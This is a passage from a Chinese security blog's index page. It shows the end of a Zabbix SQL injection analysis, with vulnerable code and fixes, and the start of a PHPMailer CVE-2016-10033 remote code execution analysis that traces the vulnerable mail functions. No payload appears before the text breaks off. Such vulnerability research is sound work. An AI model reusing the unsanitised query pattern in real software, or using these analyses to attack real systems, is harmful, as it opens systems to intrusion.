<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">private static function insertDB($idx, $value, $type, $idx2) &#123;</span><br><span class="line">        $value_type = self::getFieldByType($type);</span><br><span class="line"></span><br><span class="line">        $values = array(</span><br><span class="line">            &#x27;profileid&#x27; =&gt; get_dbid(&#x27;profiles&#x27;, &#x27;profileid&#x27;),</span><br><span class="line">            &#x27;userid&#x27; =&gt; self::$userDetails[&#x27;userid&#x27;],</span><br><span class="line">            &#x27;idx&#x27; =&gt; zbx_dbstr($idx),</span><br><span class="line">            $value_type =&gt; zbx_dbstr($value),</span><br><span class="line">            &#x27;type&#x27; =&gt; $type,</span><br><span class="line">            &#x27;idx2&#x27; =&gt; $idx2</span><br><span class="line">        );</span><br><span class="line">        return DBexecute(&#x27;INSERT INTO profiles (&#x27;.implode(&#x27;, &#x27;, array_keys($values)).&#x27;) VALUES (&#x27;.implode(&#x27;, &#x27;, $values).&#x27;)&#x27;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到第四个参数没有过滤，通过<code>DBexecute</code>被带到了数据库中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function DBexecute($query, $skip_error_messages = 0) &#123;</span><br><span class="line">    global $DB;</span><br><span class="line"></span><br><span class="line">    if (!isset($DB[&#x27;DB&#x27;]) || empty($DB[&#x27;DB&#x27;])) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result = false;</span><br><span class="line">    $time_start = microtime(true);</span><br><span class="line"></span><br><span class="line">    $DB[&#x27;EXECUTE_COUNT&#x27;]++;</span><br><span class="line"></span><br><span class="line">    switch ($DB[&#x27;TYPE&#x27;]) &#123;</span><br><span class="line">        case ZBX_DB_MYSQL:</span><br><span class="line">            if (!$result = mysqli_query($DB[&#x27;DB&#x27;], $query)) &#123;</span><br><span class="line">                error(&#x27;Error in query [&#x27;.$query.&#x27;] [&#x27;.mysqli_error($DB[&#x27;DB&#x27;]).&#x27;]&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br></pre></td></tr></table></figure>

<h2 id="0x06-漏洞修复"><a href="#0x06-漏洞修复" class="headerlink" title="0x06 漏洞修复"></a>0x06 漏洞修复</h2><ul>
<li>版本升级</li>
<li>打补丁</li>
<li>关闭guest</li>
</ul>
<h2 id="0x07-后记"><a href="#0x07-后记" class="headerlink" title="0x07 后记"></a>0x07 后记</h2><p>这里还有好多东西没有搞懂，毕竟太菜</p>

                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Sat Feb 18 2017 21:00:00 GMT+0800">2017-02-18</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/tags/PHP/">PHP</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/zabbix%20SQL%20Inject%20Vul/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/PHPMailer%20%3C%205.2.18%20Remote%20Code%20Execution(CVE-2016-10033)/">
                        PHPMailer &lt; 5.2.18 Remote Code Execution(CVE-2016-10033)
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        关键代码如下
12345678910111213141516171819202122232425262728293031323334353637protected function mailSend($header, $body)&#123;  $toArr = array();  foreach ($this-&gt;to as $toaddr) &#123;      $toArr[] = $this-&gt;addrFormat($toaddr);  &#125;  $to = implode(&#x27;, &#x27;, $toArr);  $params = null;  //This sets the SMTP envelope sender which gets turned into a return-path header by the receiver  if (!empty($this-&gt;Sender)) &#123;      $params = sprintf(&#x27;-f%s&#x27;, $this-&gt;Sender);  &#125;  if ($this-&gt;Sender != &#x27;&#x27; and !ini_get(&#x27;safe_mode&#x27;)) &#123;      $old_from = ini_get(&#x27;sendmail_from&#x27;);      ini_set(&#x27;sendmail_from&#x27;, $this-&gt;Sender);  &#125;  $result = false;  if ($this-&gt;SingleTo and count($toArr) &gt; 1) &#123;      foreach ($toArr as $toAddr) &#123;          $result = $this-&gt;mailPassthru($toAddr, $this-&gt;Subject, $body, $header, $params);          $this-&gt;doCallback($result, array($toAddr), $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From);      &#125;  &#125; else &#123;      $result = $this-&gt;mailPassthru($to, $this-&gt;Subject, $body, $header, $params);      $this-&gt;doCallback($result, $this-&gt;to, $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From);  &#125;  if (isset($old_from)) &#123;      ini_set(&#x27;sendmail_from&#x27;, $old_from);  &#125;  if (!$result) &#123;      throw new phpmailerException($this-&gt;lang(&#x27;instantiate&#x27;), self::STOP_CRITICAL);  &#125;  return true;&#125;

已知问题代码出现在mail()函数，首先定位到$result = $this-&gt;mailPassthru($toAddr, $this-&gt;Subject, $body, $header, $params);这行代码。通过mailPassthru跟踪到下面这段代码
12345678910111213141516171819private function mailPassthru($to, $subject, $body, $header, $params)    &#123;        //Check overloading of mail function to avoid double-encoding        if (ini_get(&#x27;mbstring.func_overload&#x27;) &amp; 1) &#123;            $subject = $this-&gt;secureHeader($subject);        &#125; else &#123;            $subject = $this-&gt;encodeHeader($this-&gt;secureHeader($subject));        &#125;        //Can&#x27;t use additional_parameters in safe_mode        //@link http://php.net/manual/en/function.mail.php        if (ini_get(&#x27;safe_mode&#x27;) or !$this-&gt;UseSendmailOptions or is_null($params)) &#123;            $result = @mail($to, $subject, $body, $header);        &#125; else &#123;            $result = @mail($to, $subject, $body, $header, $params);        &#125;        return $result;    &#125;

根据这段if (ini_get(&#39;safe_mode&#39;) or !$this-&gt;UseSendmailOptions or is_null($params)) &#123;     $result = @mail($to, $subject, $body, $header);可以看到只有safe_mode没有开启的情况下才存在漏洞。
假设这个函数没有开启，继续追踪到关键函数$result = @mail($to, $subject, $body, $header, $params);接下来看一看这个函数到底是怎么绕过的，追踪$params参数在setFrom()函数中发现这个参数
12345678910111213141516171819202122232425public function setFrom($address, $name = &#x27;&#x27;, $auto = true)    &#123;        $address = trim($address);        $name = trim(preg_replace(&#x27;/[\r\n]+/&#x27;, &#x27;&#x27;, $name)); //Strip breaks and trim        // Don&#x27;t validate now addresses with IDN. Will be done in send().        if (($pos = strrpos($address, &#x27;@&#x27;)) === false or            (!$this-&gt;has8bitChars(substr($address, ++$pos)) or !$this-&gt;idnSupported()) and            !$this-&gt;validateAddress($address)) &#123;            $error_message = $this-&gt;lang(&#x27;invalid_address&#x27;) . &quot; (setFrom) $address&quot;;            $this-&gt;setError($error_message);            $this-&gt;edebug($error_message);            if ($this-&gt;exceptions) &#123;                throw new phpmailerException($error_message);            &#125;            return false;        &#125;        $this-&gt;From = $address;        $this-&gt;FromName = $name;        if ($auto) &#123;            if (empty($this-&gt;Sender)) &#123;                $this-&gt;Sender = $address;            &#125;        &#125;        return true;    &#125;
函数中对address参数进行了过滤，既然这样，那问题肯定就是出现在过滤函数中了，继续往下找
过滤函数validateAddress
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091public static function validateAddress($address, $patternselect = null)    &#123;        if (is_null($patternselect)) &#123;            $patternselect = self::$validator;        &#125;        if (is_callable($patternselect)) &#123;            return call_user_func($patternselect, $address);        &#125;        //Reject line breaks in addresses; it&#x27;s valid RFC5322, but not RFC5321        if (strpos($address, &quot;\n&quot;) !== false or strpos($address, &quot;\r&quot;) !== false) &#123;            return false;        &#125;        if (!$patternselect or $patternselect == &#x27;auto&#x27;) &#123;            //Check this constant first so it works when extension_loaded() is disabled by safe mode            //Constant was added in PHP 5.2.4            if (defined(&#x27;PCRE_VERSION&#x27;)) &#123;                //This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2                if (version_compare(PCRE_VERSION, &#x27;8.0.3&#x27;) &gt;= 0) &#123;                    $patternselect = &#x27;pcre8&#x27;;                &#125; else &#123;                    $patternselect = &#x27;pcre&#x27;;                &#125;            &#125; elseif (function_exists(&#x27;extension_loaded&#x27;) and extension_loaded(&#x27;pcre&#x27;)) &#123;                //Fall back to older PCRE                $patternselect = &#x27;pcre&#x27;;            &#125; else &#123;                //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension                if (version_compare(PHP_VERSION, &#x27;5.2.0&#x27;) &gt;= 0) &#123;                    $patternselect = &#x27;php&#x27;;                &#125; else &#123;                    $patternselect = &#x27;noregex&#x27;;                &#125;            &#125;        &#125;        switch ($patternselect) &#123;            case &#x27;pcre8&#x27;:                /**                 * Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.                 * @link http://squiloople.com/2009/12/20/email-address-validation/                 * @copyright 2009-2010 Michael Rushton                 * Feel free to use and redistribute this code. But please keep this copyright notice.                 */                return (boolean)preg_match(                    &#x27;/^(?!(?&gt;(?1)&quot;?(?&gt;\\\[ -~]|[^&quot;])&quot;?(?1))&#123;255,&#125;)(?!(?&gt;(?1)&quot;?(?&gt;\\\[ -~]|[^&quot;])&quot;?(?1))&#123;65,&#125;@)&#x27; .                    &#x27;((?&gt;(?&gt;(?&gt;((?&gt;(?&gt;(?&gt;\x0D\x0A)?[\t ])+|(?&gt;[\t ]*\x0D\x0A)?[\t ]+)?)(\((?&gt;(?2)&#x27; .                    &#x27;(?&gt;[\x01-\x08\x0B\x0C\x0E-\&#x27;*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)&#x27; .                    &#x27;([!#-\&#x27;*+\/-9=?^-~-]+|&quot;(?&gt;(?2)(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*&#x27; .                    &#x27;(?2)&quot;)(?&gt;(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]&#123;64,&#125;)(?1)(?&gt;([a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)&#x27; .                    &#x27;(?&gt;(?1)\.(?!(?1)[a-z0-9-]&#123;64,&#125;)(?1)(?5))&#123;0,126&#125;|\[(?:(?&gt;IPv6:(?&gt;([a-f0-9]&#123;1,4&#125;)(?&gt;:(?6))&#123;7&#125;&#x27; .                    &#x27;|(?!(?:.*[a-f0-9][:\]])&#123;8,&#125;)((?6)(?&gt;:(?6))&#123;0,6&#125;)?::(?7)?))|(?&gt;(?&gt;IPv6:(?&gt;(?6)(?&gt;:(?6))&#123;5&#125;:&#x27; .                    &#x27;|(?!(?:.*[a-f0-9]:)&#123;6,&#125;)(?8)?::(?&gt;((?6)(?&gt;:(?6))&#123;0,4&#125;):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]&#123;2&#125;&#x27; .                    &#x27;|[1-9]?[0-9])(?&gt;\.(?9))&#123;3&#125;))\])(?1)$/isD&#x27;,                    $address                );            case &#x27;pcre&#x27;:                //An older regex that doesn&#x27;t need a recent PCRE                return (boolean)preg_match(                    &#x27;/^(?!(?&gt;&quot;?(?&gt;\\\[ -~]|[^&quot;])&quot;?)&#123;255,&#125;)(?!(?&gt;&quot;?(?&gt;\\\[ -~]|[^&quot;])&quot;?)&#123;65,&#125;@)(?&gt;&#x27; .                    &#x27;[!#-\&#x27;*+\/-9=?^-~-]+|&quot;(?&gt;(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*&quot;)&#x27; .                    &#x27;(?&gt;\.(?&gt;[!#-\&#x27;*+\/-9=?^-~-]+|&quot;(?&gt;(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*&quot;))*&#x27; .                    &#x27;@(?&gt;(?![a-z0-9-]&#123;64,&#125;)(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)(?&gt;\.(?![a-z0-9-]&#123;64,&#125;)&#x27; .                    &#x27;(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?))&#123;0,126&#125;|\[(?:(?&gt;IPv6:(?&gt;(?&gt;[a-f0-9]&#123;1,4&#125;)(?&gt;:&#x27; .                    &#x27;[a-f0-9]&#123;1,4&#125;)&#123;7&#125;|(?!(?:.*[a-f0-9][:\]])&#123;8,&#125;)(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,6&#125;)?&#x27; .                    &#x27;::(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,6&#125;)?))|(?&gt;(?&gt;IPv6:(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:&#x27; .                    &#x27;[a-f0-9]&#123;1,4&#125;)&#123;5&#125;:|(?!(?:.*[a-f0-9]:)&#123;6,&#125;)(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,4&#125;)?&#x27; .                    &#x27;::(?&gt;(?:[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,4&#125;):)?))?(?&gt;25[0-5]|2[0-4][0-9]|1[0-9]&#123;2&#125;&#x27; .                    &#x27;|[1-9]?[0-9])(?&gt;\.(?&gt;25[0-5]|2[0-4][0-9]|1[0-9]&#123;2&#125;|[1-9]?[0-9]))&#123;3&#125;))\])$/isD&#x27;,                    $address                );            case &#x27;html5&#x27;:                /**                 * This is the pattern used in the HTML5 spec for validation of &#x27;email&#x27; type form input elements.                 * @link http://www.whatwg.org/specs/web-apps/current-work/#e-mail-state-(type=email)                 */                return (boolean)preg_match(        ...
                    
                </div> -->
                <div class="article-content markdown-body">
                    <p>关键代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">protected function mailSend($header, $body)</span><br><span class="line">&#123;</span><br><span class="line">  $toArr = array();</span><br><span class="line">  foreach ($this-&gt;to as $toaddr) &#123;</span><br><span class="line">      $toArr[] = $this-&gt;addrFormat($toaddr);</span><br><span class="line">  &#125;</span><br><span class="line">  $to = implode(&#x27;, &#x27;, $toArr);</span><br><span class="line"></span><br><span class="line">  $params = null;</span><br><span class="line">  //This sets the SMTP envelope sender which gets turned into a return-path header by the receiver</span><br><span class="line">  if (!empty($this-&gt;Sender)) &#123;</span><br><span class="line">      $params = sprintf(&#x27;-f%s&#x27;, $this-&gt;Sender);</span><br><span class="line">  &#125;</span><br><span class="line">  if ($this-&gt;Sender != &#x27;&#x27; and !ini_get(&#x27;safe_mode&#x27;)) &#123;</span><br><span class="line">      $old_from = ini_get(&#x27;sendmail_from&#x27;);</span><br><span class="line">      ini_set(&#x27;sendmail_from&#x27;, $this-&gt;Sender);</span><br><span class="line">  &#125;</span><br><span class="line">  $result = false;</span><br><span class="line">  if ($this-&gt;SingleTo and count($toArr) &gt; 1) &#123;</span><br><span class="line">      foreach ($toArr as $toAddr) &#123;</span><br><span class="line">          $result = $this-&gt;mailPassthru($toAddr, $this-&gt;Subject, $body, $header, $params);</span><br><span class="line">          $this-&gt;doCallback($result, array($toAddr), $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">      $result = $this-&gt;mailPassthru($to, $this-&gt;Subject, $body, $header, $params);</span><br><span class="line">      $this-&gt;doCallback($result, $this-&gt;to, $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From);</span><br><span class="line">  &#125;</span><br><span class="line">  if (isset($old_from)) &#123;</span><br><span class="line">      ini_set(&#x27;sendmail_from&#x27;, $old_from);</span><br><span class="line">  &#125;</span><br><span class="line">  if (!$result) &#123;</span><br><span class="line">      throw new phpmailerException($this-&gt;lang(&#x27;instantiate&#x27;), self::STOP_CRITICAL);</span><br><span class="line">  &#125;</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>已知问题代码出现在mail()函数，首先定位到<code>$result = $this-&gt;mailPassthru($toAddr, $this-&gt;Subject, $body, $header, $params);</code>这行代码。<br>通过<code>mailPassthru</code>跟踪到下面这段代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">private function mailPassthru($to, $subject, $body, $header, $params)</span><br><span class="line">    &#123;</span><br><span class="line">        //Check overloading of mail function to avoid double-encoding</span><br><span class="line">        if (ini_get(&#x27;mbstring.func_overload&#x27;) &amp; 1) &#123;</span><br><span class="line">            $subject = $this-&gt;secureHeader($subject);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $subject = $this-&gt;encodeHeader($this-&gt;secureHeader($subject));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //Can&#x27;t use additional_parameters in safe_mode</span><br><span class="line">        //@link http://php.net/manual/en/function.mail.php</span><br><span class="line">        if (ini_get(&#x27;safe_mode&#x27;) or !$this-&gt;UseSendmailOptions or is_null($params)) &#123;</span><br><span class="line">            $result = @mail($to, $subject, $body, $header);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $result = @mail($to, $subject, $body, $header, $params);</span><br><span class="line">        &#125;</span><br><span class="line">        return $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据这段<code>if (ini_get(&#39;safe_mode&#39;) or !$this-&gt;UseSendmailOptions or is_null($params)) &#123;     $result = @mail($to, $subject, $body, $header);</code>可以看到只有<code>safe_mode</code>没有开启的情况下才存在漏洞。</p>
<p>假设这个函数没有开启，继续追踪到关键函数<code>$result = @mail($to, $subject, $body, $header, $params);</code><br>接下来看一看这个函数到底是怎么绕过的，追踪<code>$params</code>参数<br>在<code>setFrom()</code>函数中发现这个参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public function setFrom($address, $name = &#x27;&#x27;, $auto = true)</span><br><span class="line">    &#123;</span><br><span class="line">        $address = trim($address);</span><br><span class="line">        $name = trim(preg_replace(&#x27;/[\r\n]+/&#x27;, &#x27;&#x27;, $name)); //Strip breaks and trim</span><br><span class="line">        // Don&#x27;t validate now addresses with IDN. Will be done in send().</span><br><span class="line">        if (($pos = strrpos($address, &#x27;@&#x27;)) === false or</span><br><span class="line">            (!$this-&gt;has8bitChars(substr($address, ++$pos)) or !$this-&gt;idnSupported()) and</span><br><span class="line">            !$this-&gt;validateAddress($address)) &#123;</span><br><span class="line">            $error_message = $this-&gt;lang(&#x27;invalid_address&#x27;) . &quot; (setFrom) $address&quot;;</span><br><span class="line">            $this-&gt;setError($error_message);</span><br><span class="line">            $this-&gt;edebug($error_message);</span><br><span class="line">            if ($this-&gt;exceptions) &#123;</span><br><span class="line">                throw new phpmailerException($error_message);</span><br><span class="line">            &#125;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;From = $address;</span><br><span class="line">        $this-&gt;FromName = $name;</span><br><span class="line">        if ($auto) &#123;</span><br><span class="line">            if (empty($this-&gt;Sender)) &#123;</span><br><span class="line">                $this-&gt;Sender = $address;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>函数中对<code>address</code>参数进行了过滤，既然这样，那问题肯定就是出现在过滤函数中了，继续往下找</p>
<p>过滤函数<code>validateAddress</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">public static function validateAddress($address, $patternselect = null)</span><br><span class="line">    &#123;</span><br><span class="line">        if (is_null($patternselect)) &#123;</span><br><span class="line">            $patternselect = self::$validator;</span><br><span class="line">        &#125;</span><br><span class="line">        if (is_callable($patternselect)) &#123;</span><br><span class="line">            return call_user_func($patternselect, $address);</span><br><span class="line">        &#125;</span><br><span class="line">        //Reject line breaks in addresses; it&#x27;s valid RFC5322, but not RFC5321</span><br><span class="line">        if (strpos($address, &quot;\n&quot;) !== false or strpos($address, &quot;\r&quot;) !== false) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$patternselect or $patternselect == &#x27;auto&#x27;) &#123;</span><br><span class="line">            //Check this constant first so it works when extension_loaded() is disabled by safe mode</span><br><span class="line">            //Constant was added in PHP 5.2.4</span><br><span class="line">            if (defined(&#x27;PCRE_VERSION&#x27;)) &#123;</span><br><span class="line">                //This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2</span><br><span class="line">                if (version_compare(PCRE_VERSION, &#x27;8.0.3&#x27;) &gt;= 0) &#123;</span><br><span class="line">                    $patternselect = &#x27;pcre8&#x27;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    $patternselect = &#x27;pcre&#x27;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; elseif (function_exists(&#x27;extension_loaded&#x27;) and extension_loaded(&#x27;pcre&#x27;)) &#123;</span><br><span class="line">                //Fall back to older PCRE</span><br><span class="line">                $patternselect = &#x27;pcre&#x27;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension</span><br><span class="line">                if (version_compare(PHP_VERSION, &#x27;5.2.0&#x27;) &gt;= 0) &#123;</span><br><span class="line">                    $patternselect = &#x27;php&#x27;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    $patternselect = &#x27;noregex&#x27;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        switch ($patternselect) &#123;</span><br><span class="line">            case &#x27;pcre8&#x27;:</span><br><span class="line">                /**</span><br><span class="line">                 * Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.</span><br><span class="line">                 * @link http://squiloople.com/2009/12/20/email-address-validation/</span><br><span class="line">                 * @copyright 2009-2010 Michael Rushton</span><br><span class="line">                 * Feel free to use and redistribute this code. But please keep this copyright notice.</span><br><span class="line">                 */</span><br><span class="line">                return (boolean)preg_match(</span><br><span class="line">                    &#x27;/^(?!(?&gt;(?1)&quot;?(?&gt;\\\[ -~]|[^&quot;])&quot;?(?1))&#123;255,&#125;)(?!(?&gt;(?1)&quot;?(?&gt;\\\[ -~]|[^&quot;])&quot;?(?1))&#123;65,&#125;@)&#x27; .</span><br><span class="line">                    &#x27;((?&gt;(?&gt;(?&gt;((?&gt;(?&gt;(?&gt;\x0D\x0A)?[\t ])+|(?&gt;[\t ]*\x0D\x0A)?[\t ]+)?)(\((?&gt;(?2)&#x27; .</span><br><span class="line">                    &#x27;(?&gt;[\x01-\x08\x0B\x0C\x0E-\&#x27;*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)&#x27; .</span><br><span class="line">                    &#x27;([!#-\&#x27;*+\/-9=?^-~-]+|&quot;(?&gt;(?2)(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*&#x27; .</span><br><span class="line">                    &#x27;(?2)&quot;)(?&gt;(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]&#123;64,&#125;)(?1)(?&gt;([a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)&#x27; .</span><br><span class="line">                    &#x27;(?&gt;(?1)\.(?!(?1)[a-z0-9-]&#123;64,&#125;)(?1)(?5))&#123;0,126&#125;|\[(?:(?&gt;IPv6:(?&gt;([a-f0-9]&#123;1,4&#125;)(?&gt;:(?6))&#123;7&#125;&#x27; .</span><br><span class="line">                    &#x27;|(?!(?:.*[a-f0-9][:\]])&#123;8,&#125;)((?6)(?&gt;:(?6))&#123;0,6&#125;)?::(?7)?))|(?&gt;(?&gt;IPv6:(?&gt;(?6)(?&gt;:(?6))&#123;5&#125;:&#x27; .</span><br><span class="line">                    &#x27;|(?!(?:.*[a-f0-9]:)&#123;6,&#125;)(?8)?::(?&gt;((?6)(?&gt;:(?6))&#123;0,4&#125;):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]&#123;2&#125;&#x27; .</span><br><span class="line">                    &#x27;|[1-9]?[0-9])(?&gt;\.(?9))&#123;3&#125;))\])(?1)$/isD&#x27;,</span><br><span class="line">                    $address</span><br><span class="line">                );</span><br><span class="line">            case &#x27;pcre&#x27;:</span><br><span class="line">                //An older regex that doesn&#x27;t need a recent PCRE</span><br><span class="line">                return (boolean)preg_match(</span><br><span class="line">                    &#x27;/^(?!(?&gt;&quot;?(?&gt;\\\[ -~]|[^&quot;])&quot;?)&#123;255,&#125;)(?!(?&gt;&quot;?(?&gt;\\\[ -~]|[^&quot;])&quot;?)&#123;65,&#125;@)(?&gt;&#x27; .</span><br><span class="line">                    